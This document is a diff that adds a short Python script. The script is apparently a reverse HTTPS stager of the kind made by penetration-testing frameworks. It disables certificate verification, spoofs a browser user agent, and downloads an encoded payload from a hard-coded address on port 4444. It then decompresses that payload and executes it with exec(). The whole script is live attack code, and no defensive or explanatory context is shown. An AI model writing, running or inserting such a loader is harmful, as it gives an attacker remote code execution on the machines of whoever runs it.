@@ -1,0 +1,16 @@
+#!/usr/bin/env python -W ignore::DeprecationWarning
+import warnings
+warnings.filterwarnings("ignore", category=DeprecationWarning)
+import zlib,base64,sys
+vi=sys.version_info
+ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener','HTTPSHandler'])
+hs=[]
+if (vi[0]==2 and vi>=(2,7,9)) or vi>=(3,4,3):
+	import ssl
+	sc=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+	sc.check_hostname=False
+	sc.verify_mode=ssl.CERT_NONE
+	hs.append(ul.HTTPSHandler(0,sc))
+o=ul.build_opener(*hs)
+o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36')]
+exec(zlib.decompress(base64.b64decode(o.open('https://10.0.2.4:4444/oiv7SR3Zt2ycs4mn_5aLDAoeHb2o6dO_UXFqlil-_9oSJNSQ').read())))
